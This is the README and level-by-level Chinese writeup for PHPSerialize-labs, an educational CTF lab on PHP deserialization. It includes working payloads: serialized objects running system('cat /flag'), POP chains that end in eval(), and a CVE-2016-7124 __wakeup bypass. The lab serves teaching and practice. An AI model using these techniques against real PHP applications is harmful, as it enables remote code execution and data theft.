## About

> hello-ctf.com 基础靶场计划，访问 [[hello-ctf.com 配套靶场]](https://hello-ctf.com/hc-labs/)  探索更多靶场。

PHPSerialize-labs是一个使用php语言编写的，用于学习CTF中PHP反序列化的入门靶场。

旨在帮助大家对PHP的序列化和反序列化有一个全面的了解。

在开始学习序列化和反序列化之前，请先完成一些前导课程：

- PHP环境配置
- PHP语法基础
- PHP面向对象编程

若您对以上内容不熟悉，推荐您阅读菜鸟教程中 [PHP面向对象](https://www.runoob.com/php/php-oop.html) 部分。

关卡信息如下：

| 靶场序号 | 知识点内容                   | 更新时间   |
| :------- | :--------------------------- | :--------- |
| Level 1  | 类的实例化                   | 2024/07/04 |
| Level 2  | 对象中值的传递               | 2024/07/04 |
| Level 3  | 对象中值的权限               | 2024/07/04 |
| Level 4  | 序列化初体验                 | 2024/07/04 |
| Level 5  | 序列化的普通值规则           | 2024/07/04 |
| Level 6  | 序列化的权限修饰规则         | 2024/07/04 |
| Level 7  | 实例化和反序列化             | 2024/07/05 |
| Level 8  | 构造函数和析构函数以及GC机制 | 2024/07/05 |
| Level 9  | 构造函数的后门               | 2024/07/05 |
| Level 10 | __wakeup()                   | 2024/07/07 |
| Level 11 | __wakeup() CVE-2016-7124     | 2024/07/07 |
| Level 12 | __sleep()                    | 2024/07/07 |
| Level 13 | __toString()                 | 2024/07/07 |
| Level 14 | __invoke()                   | 2024/07/07 |
| Level 15 | POP链前置                    | 2024/07/07 |
| Level 16 | POP链构造                    | 2024/07/07 |
| Level 17 | 字符串逃逸基础-无中生有      | 2024/07/07 |
| Level 18 | 字符串逃逸基础-判定规则      | 2024/07/07 |

> 计划中的内容：
>
> 引用的利用
>
> 字符串逃逸基础 - 序列化的布尔
>
> 字符串逃逸 - 减少
>
> 字符串逃逸 - 增多
>
> sesssion 反序列化
>
> phar 反序列化
>
> 练习题集

练习题集内容：

## 部署

### 本地部署

1. 下载并安装 [PHPStudy](https://www.xp.cn/phpstudy#phpstudy)
2. 将网站根目录设置为 `PHPSerialize-labs` 目录
3. 启动 Apache 服务
4. 在浏览器中访问 <http://localhost/>

### Docker 部署

使用以下命令快速启动：

```bash
docker run -p 8080:80 -d ghcr.io/probiusofficial/phpserialize-labs
```

启动后访问：<http://localhost:8080/>

### Docker Compose 部署

1. 克隆项目到本地：

```bash
git clone --depth 1 https://github.com/ProbiusOfficial/PHPSerialize-labs.git
```

2. 启动服务：

```bash
cd PHPSerialize-labs
docker-compose up -d
```

启动后访问：<http://localhost:8080/>

### 合作平台

题目已上线 [【NSSCTF平台】](https://www.nssctf.cn/problem) 可在来源中选择 **HelloCTF** 或直接搜索 **反序列化靶场**：

# WriteUP

## Level 1

第一题考察 类的实例化 —— 也就是对象的创建。

在 PHP 中，我们使用 new + 类名() 去创建一个对象。

**POST提交：**(注意由于防止非预期使用判断new的方法导致第一个方法无法使用，但思路不受影响)

code=`new FLAG();`

code=`$o=new FLAG();`

## Level 2

考察对象的赋值操作，相比于面向过程，对对象中值的更改，需要通过 `->` 符号来指向可修改的变量，这里的可修改指的是 控制修饰符 public 对应的值，像 protected 和 private 修饰的值，需要使用更复杂的修改方法。

对于任何可以修改的值，我们使用 `$对象名 -> 对应值 = 值` .eg: `$object_name->a="a"`

所以在这个题目中，我们需要将 `$flag_string` 赋值给 `$free_flag` 以便我们后面的 `get_free_flag()` 函数将他输出出来。

**POST提交：**

code=`$target->free_flag=$flag_string;`

## Level 3

考察 控制修饰符：

- **public（公有）：** 公有的类成员可以在任何地方被访问。
- **protected（受保护）：** 受保护的类成员则可以被其自身以及其子类和父类访问。(可继承)
- **private（私有）：** 私有的类成员则只能被其定义所在的类访问。(不可继承)

这里 SubFLAG 继承了 FLAG，除开 public 修饰的值，对于另外两个：

- `protected $protected_flag` 可以通过 `get_protected_flag()` / `get_private_flag()` 访问，因为受保护的变量是可以被继承的。
- `private $private_flag`则只能通过 `get_private_flag()` 进行访问，因为私有变量不能被继承。

而对象中函数的调用和值的访问类似，也通过 `->` 符号实现：`$对象名 -> 函数名();`

**POST提交：**

code=`echo $target->public_flag.$target->get_protected_flag().$target->get_private_flag();`

code=`echo $target->public_flag.$sub_target->show_protected_flag().$target->get_private_flag();`

## Level 4

一道用来考察序列化的套壳题目，序列化虽然不会标记函数，但是会完整的输出变量和变量内容。

题目已经使用 `$flag_is_here = new FLAG();` 实例化创建了一个对象，所以我们只需要序列化并且打印出来这一段字符串。

**POST提交：**

code=`echo serialize($flag_is_here);`

你会得到这样的字符串：

```PHP
O:4:"FLAG":3:{s:18:"FLAGflag1_string";s:8:"ser4l1ze";s:18:"FLAGflag2_number";i:2;s:18:"FLAGflag3_object";O:5:"FLAG3":1:{s:25:"FLAG3flag3_object_array";a:2:{i:0;s:3:"se3";i:1;s:2:"me";}}}
```

挑出对应部分拼接即可。

## Level 5

演示和考察序列化中 不同类型变量的不同格式。

而从结果上理解，反序列化其实和参数创建是一个等同的过程 —— 比如下面的例子：

```PHP
$a_string = "HelloCTF"; /*<=等价于=>*/ $a_string = unserialize('s:8:"HelloCTF";');
```

所以该题目按照后面部分的要求编写对应的变量进行序列化，将字符串赋给对应参数即可。

```PHP
<?php 

class a_class{
    public $a_value = "HelloCTF";
}

$your_object = new a_class();
$your_boolean = true;
$your_NULL = null;
$your_string = "IWANT";
$your_number = 1;
$your_object->a_value = "FLAG";
$your_array = array('a'=>"Plz",'b'=>"Give_M3");

$exp = "o=".serialize($your_object)."&s=".serialize($your_string)."&a=".serialize($your_array)."&i=".serialize($your_number)."&b=".serialize($your_boolean)."&n=".serialize($your_NULL);

echo $exp;
```

## Level 6

同样是演示和考察序列化中不同类型变量的不同格式，但这里比较特殊 —— 因为引入了控制修饰符。

在对象的序列化和反序列化中，不同控制修饰符，序列化出来的字符串是不同的：

```PHP
<?php 

class Demo{
    public $a;
    protected $b;
    private $c;
}

echo urlencode(serialize(new Demo()));
# O%3A4%3A%22Demo%22%3A3%3A%7Bs%3A1%3A%22a%22%3BN%3Bs%3A4%3A%22%00%2A%00b%22%3BN%3Bs%3A7%3A%22%00Demo%00c%22%3BN%3B%7D
# O:4:"Demo":3:{s:1:"a";N;s:4:"%00*%00b";N;s:7:"%00Demo%00c";N;}
```

这里的 `%00` 是一个**不可见**的控制字符-`NULL`，对比不难看出对应的规则：

- **protected（受保护）：**  `%00*%00变量名`
- **private（私有）：** `%00类名%00变量名`

所以在序列化和反序列化的题目中 我们提倡在输出EXP的时候添加一个 `urlencode()` 以避免不可见字符的干扰。

在本题中只需要给对应的变量赋值即可，考察点是在输出的格式上面，由于不可见控制字符的带入，需要使用URL编码来避免丢失。

```PHP
<?php 
class protectedKEY{
    protected $protected_key = "protected_key";
}
class privateKEY{
    private $private_key = "private_key";
}

$exp = "protected_key=".urlencode(serialize(new protectedKEY))."&private_key=".urlencode(serialize(new privateKEY));

echo $exp;
```

## Level 7

实例化和反序列化的演示，并且简单的展示了反序列化漏洞的原理。

从结果上来看，实例化和反序列化是一样的，这都会去创建一个对象，但是如果目标类没有构造函数，那么其中的参数控制是不同的。

在没有构造函数时，实例化中对象的各种参数在类中已经决定好了，除非创建后修改；而反序列化则是根据序列化的字符串来**"还原"**对象的 —— 这也就意味着，我们可以通过改变序列化的字符串来决定他"**还原**"对象中各种量的值。

```PHP
class FLAG{
    public $flag_command = "echo 'Hello CTF!<br>';";

    function backdoor(){
        eval($this->flag_command);
    }
}
$Unserialize_object = unserialize('O:4:"FLAG":1:{s:12:"flag_command";s:24:"echo 'Hello World!<br>';";}');
```

比如在这个代码例子中，我们可以更改 `s:24:"echo 'Hello World!<br>';"` 这个字符串来做到控制最后 `backdoor()` 函数的执行结果。

所以对于该题目中`unserialize($_POST['o'])->backdoor();`，EXP：

```PHP
<?php 
class FLAG{
    public $flag_command = "system('tac flag.php');";
}
$exp = "o=".urlencode(serialize(new FLAG()));
echo $exp;
```

## Level 8

考察 构造函数 (`__construct()`) 和 析构函数 (`__destruct()`) ，并且引入了一些 PHP垃圾回收机制的知识点 —— 请注意，GC机制和析构函数息息相关。

构造函数只会在类实例化的时候 —— 也就是使用 new 的方法手动创建对象的时候才会触发，而通过反序列化创建的对象不会触发这一方法，这也是为什么，在前面的内容，我将反序列化的对象创建过程称作为 “**还原**”。

析构函数会在对象被回收的时候触发 —— 手动回收和自动回收。

手动回收：就是代码中演示的 unset 方法用于释放对象。

自动回收：对象没有值引用指向，或者脚本结束完全释放，具体看题目中的演示结合该部分文字应该不难理解。

题目要求 全局变量 标识符flag的值大于5，根据 __destruct() 和 PHP GC 的特性，我们可以不断地去序列化和反序列化一个对象，然后不给该对象具体的引用以触发自动销毁机制。

**POST：**

code=`unserialize(serialize(unserialize(serialize(unserialize(serialize(unserialize(serialize(new RELFLAG()))))))));`

## Level 9

序列化和反序列化中的常规简单题目，这里考察的是一个析构函数漏洞的利用点，其实可以类比之前 实例化和反序列化，此外 本题为动态容器，flag位于根目录下 /flag EXP如下：

```PHP
<?php
class FLAG {
    var $flag_command = "system('cat /flag');";
}
$exp = "o=".urlencode(serialize(new FLAG()));
echo $exp;
```

要注意PHP语句要用`;`结尾。

## Level 10

正式的进入了反序列化的题目，这里我们从第一个常见的魔术方法 —— `__wakeup()` 开始。

> [unserialize()](https://www.php.net/manual/zh/function.unserialize.php) 会检查是否存在一个 [__wakeup()](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup) 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。
>
> [__wakeup()](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup) 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。
>
> ——[【PHP 手册 - 魔术方法 # wakeup】](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup)

当我们从序列化字符串还原对象，也就是进行反序列化操作的时候，wakeup方法会被触发：

```PHP
class FLAG{
    function __wakeup() {
        include 'flag.php';
        echo $flag;
    }
}

if(isset($_POST['o']))
{
    unserialize($_POST['o']);
}else {
    highlight_file(__FILE__);
}
?>
```

题目要求我们用 `o` 以POST的方式提交一个序列化字符串，而后进行反序列化工作，所以我们只需要在本地创建FLAG类然后序列化为字符串即可，EXP：

```PHP
<?php 
class FLAG{}

$obj = new FLAG();

echo urlencode(serialize($obj));
```

## Level 11

考察一个wakeup的Bypass CVE：**CVE-2016-7124**

> 如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行。

```PHP
class FLAG {
    public $flag = "FAKEFLAG";

    public function  __wakeup(){
        global $flag;
        $flag = NULL;
    }
    public function __destruct(){
        global $flag;
        if ($flag !== NULL) {
            echo $flag;
        }else
        {
            echo "sorry,flag is gone!";
        }
    }
}
```

我们先使用语句`echo serialize(new FLAG());` 将其对应的序列化字符串输出出来，得到：

```PHP
O:4:"FLAG":1:{s:4:"flag";s:8:"FAKEFLAG";}
```

可以看到，该类有一个成员属性，我们手动修改成员属性对象的数量 1 -> 2：

```PHP
O:4:"FLAG":2:{s:4:"flag";s:8:"FAKEFLAG";}
```

再按照对应的要求，用 o 以 POST 的方式提交即可：

```PHP
o=O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A4%3A%22flag%22%3Bs%3A8%3A%22FAKEFLAG%22%3B%7D
```

## Level 12

考察魔术方法 __sleep() 的使用。

serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。

- **必要的返回内容**：该方法必须返回一个数组: return array('属性1', '属性2', '属性3') / return ['属性1', '属性2', '属性3']，数组中的属性名将决定哪些变量将被序列化，当属性被 static 修饰时，无论有无都无法序列化该属性。
- **私有属性命名**：如果需要返回父类中的私有属性，需要使用序列化中的特殊格式 - `%00父类名称%00变量名` (%00 是 ASCII 值为 0 的空字符 null,在代码内我们也可以通过 "\0" - 注意在双引号中，PHP 才会解析转义字符和变量。)。
  - 例如，父类 FLAG 的私有属性 `private $f`; 应该在子类的`__sleep()` 方法中以 "`\0FLAG\0f`" 的格式返回。
- **未返回任何内容**：如果 `__sleep()` 方法未返回任何内容或返回非数组类型，会触发 E_NOTICE 级别的错误，并且对象会被序列化为 `null` 空值。

该题目是一个 演示 + 实践 的组合题目（通俗点就是缝合怪（bushi

```PHP
return array($array_list[$_],$array_list[$__],$this->chance());
```

可以看到，每次我们请求的时候脚本都会返回两个随机数组，而这两个随机数组会决定我们看到的序列化字符串中涉及的变量，因此每次请求得到的字符串是不一样的。

而且下面的这部分代码告诉我们：

```PHP
$array_list = ['h','e','l','I','o','c','t','f','f','l','a','g'];
```

每一次随机的字符串都是单字符 —— 这也就意味着，当他调用父类对象中的私有属性时无法显示，因为前面我们说到：“如果需要返回父类中的私有属性，需要使用序列化中的特殊格式 - `%00父类名称%00变量名`”。

好在题目提供了另一个方法：`function chance() { return $_GET['chance']; }` 来让我们自定义反序列化的内容。

最终的Flag：

```PHP
HelloCTF{Th3___sleep_function__is_called_before_serialization_t0_clean_up_4nd_select_variab1es}
```

## Level 13

本关考验你魔法方法中的 __toString() 方法，你将有该方法的对象，打印出来，得到 Flag 方可过关，你明白吗（雾

__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。

题目已经完成了类的实例化：`$obj = new FLAG();`

所以我们只需要 POST 提交 `o=echo $obj;` 即可。

## Level 14

该关卡考察魔术方法 __invoke()，当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。例如 $obj()。

__invoke() 也可以接受参数，如题目所示：

```PHP
class FLAG{
    function __invoke($x) {
        if ($x == 'get_flag') {
            include 'flag.php';
            echo $flag;
        }
    }
}
$obj = new FLAG();
```

对象已经被实例化，我们需要给该对象传入 'get_flag' 字符串：

`o=$obj('get_flag')`,POST 提交即可。

## Level 15

一个简单的POP链题目原理题 —— 虽然是POP链有多个对象但本质上只用到了__wakeUp()魔术方法。

在 PHP 的面向对象中，对象的成员属性可以是一个对象（这里的对象包括自己在内的对象和其他对象）。

在序列化和反序列化题目中，我们通常从终点向上查找，比如下面的题目： 很明显，终点是：`class destnation` — `public function action(){ eval($this->cmd->a->b->c); }`

接下来就是考虑去调用终点，查找所有类，最后在D类中可以看到：

```
class D { public function __wakeUp() { $this->d->action(); }
```

即 `__wakeUp()` 函数存在一个 `action()` 的函数调用，所以我们只需要让 `$this->d` 的值为 实例化的 `class destnation`即可，那么EXP如下：

```PHP
<?php

class A {
    public $a;
    public function __construct($a) {
        $this->a = $a;
    }
}
class B {
    public $b;
    public function __construct($b) {
        $this->b = $b;
    }
}
class C {
    public $c;
    public function __construct($c) {
        $this->c = $c;
    }
}

class D {
    public $d;
    public function __construct($d) {
        $this->d = $d;
    }
    public function __wakeUp() {
        $this->d->action();
    }
}

class destnation {
    var $cmd;
    public function __construct($cmd) {
        $this->cmd = $cmd;
    }
    public function action(){
        eval($this->cmd->a->b->c);
    }
}

$c = new C("system('cat /flag');");
$b = new B($c);
$a = new A($b);
$des = new destnation($a);
$d =  new D($des);

unserialize(serialize($d));
```

## Level 16

第一个真正意义上的POP链，这里涉及到了三个我们在前面学过的魔术方法：

- `__wakeUp()` 方法用于反序列化时自动调用。例如 unserialize()。
- `__invoke()` 方法用于一个对象被当成函数时应该如何回应。例如 $obj() 应该显示些什么。
- `__toString()` 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。

同样的我们先找终点 ——

```PHP
class A {
    public $a;
    public function __invoke() {
            include $this->a;
            return $flag;
    }
}
```

很明显终点也需要一些更改：$this->a 的值要为 flag.php

然后查找，哪里有函数调用相关的类：

```PHP
class B {
    public $b;
    public function __toString() {
        return ($this->b)();
    }
}
```

那么让 $b = new A() 即可。

接下来就是触发 __toString() ，那么向上查找打印相关的函数 ——

```PHP
class INIT {
    public $name;
    public function __wakeUp() {
        echo $this->name.' is awake!';
    }
}
```

至此写出链子 INIT->name-->B->b->A->a，EXP:

```PHP
class A {
    public $a='flag.php';
}

class B {
    public $b;
}

class INIT {
    public $name;
}

$a = new A();
$b = new B();
$b->b = $a;
$init = new INIT();
$init->name  = $b;

echo urlencode(serialize($init));
```

## Level 17

本题为字符串逃逸题目的前置基础题，反序列化创建的对象由原始对象和序列化字符串共同决定，但是后者的优先级更高，这也就产生了一个"无中生有"的特性 —— 在极端条件下，A 类的代码定义为 `class A {}` 是一个完全空白的类，但此时用一个同样是A类但是有多种变量的对象创建的序列化字符串去反序列化还原时，可以得到一个拥有对应变量的A对象，这一点题目中演示得比较清楚。

为什么说共同决定，当序列化字符串中没有对应类的一些成员属性的时候，在反序列化时，解释器会直接从当前类中 COPY 序列化中不存在的成员属性。

这个题目最终需要构建一还原后属于A类的序列化字符串，其中需要存在一个变量`helloctfcmd` 的值为 `get_flag`，本地构建一个符合要求的A类直接输出序列化字符串即可：

```PHP
class A {
    public $helloctfcmd = "get_flag";
}
echo urlencode(serialize(new A()));
```

## Level 18

本题依旧为字符串逃逸题目的前置基础题，序列化和反序列化另一个的规则特性,字符串尾部判定：在进行反序列化时，当成员属性的数量，名称长度，内容长度均一致时，程序会以 ";}" 作为字符串的结尾判定。

在前面的序列化过程我们可以得到这样的字符串：

```PHP
O:4:"Demo":3:{s:1:"a";s:5:"Hello";s:1:"b";s:3:"CTF";s:3:"key";s:20:"GET_FLAG";}FAKE_FLAG";}
```

而阅读最后FLAG的条件源码，可知：

```PHP
if ($FLAG instanceof FLAG && $FLAG->key == 'GET_FLAG') {
    include 'flag.php';
    echo $flag;
} else {
    echo "Your serliaze string is ".$serliseStringFLAG . "<br> And Here is ";
    var_dump($FLAG);
}
```

可以看到本题要求我们做一些替换工作让 `key` 值为 `GET_FLAG` ，而在前面的对象创建过程中，我们知道 key 值为 `GET_FLAG";}FAKE_FLAG`，根据我们所知的特性，将 key 值对应的字符数量缩窄只留下 `GET_FLAG`，也就是 8 个字符 —— 将 20 替换为 8即可，接着 题目要求一个新的 FLAG 类，所以还需要将类名标识由 Demo 改为 FLAG。

```PHP
$target = array('Demo', 20);
$change = array('FLAG', 8);
```

构造的exp：

```bash
../index.php?target[]=Demo&target[]=20&change[]=FLAG&change[]=8
```

# 推荐的学习资源

- [[PHP反序列化这一篇就够了- Y4tacker]](https://github.com/Y4tacker/Web-Security/blob/9ac18c13c650ca193531baeb945e2af4d767f61d/Unserialize/PHP/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.md)

  > 最详细的PHP反序列化一文教程。

- [Bilibili-橙子科技-PHP反序列化漏洞学习](https://www.bilibili.com/video/BV1R24y1r71C)

  > 为爱发电最强的一集，陈腾师傅的课应该是圈里面讲的最细的了，而且是一套完整体系，通俗易懂，很推荐各位看x  
  > 这个视频还有一套配套的靶场:[mcc0624/php_ser_Class](https://github.com/mcc0624/php_ser_Class)

- [ctfshow/web257-268](https://ctf.show/challenges#web254-713)

  > ctfshow的题目是圈内出名的体系化和梯度化，很适合新手入门，其WP在网络上很容易找到，生态很不错。
  > 当然ctfshow本身也有视频讲解：[Bilibili-ctfshow-Web257-268](https://www.bilibili.com/video/BV1D64y1m78f)

- [php-SER-labs-docker](https://github.com/ProbiusOfficial/php-SER-labs-docker)

  > 基于fine-1(这周末在做梦)师傅的靶场（<https://github.com/fine-1/php-SER-libs）添加的容器版本，，在README中附带有WriteUp>

- [PHP 手册](https://www.php.net/manual/zh/)

  > PHP官方手册，遇事不决，看看说明书x
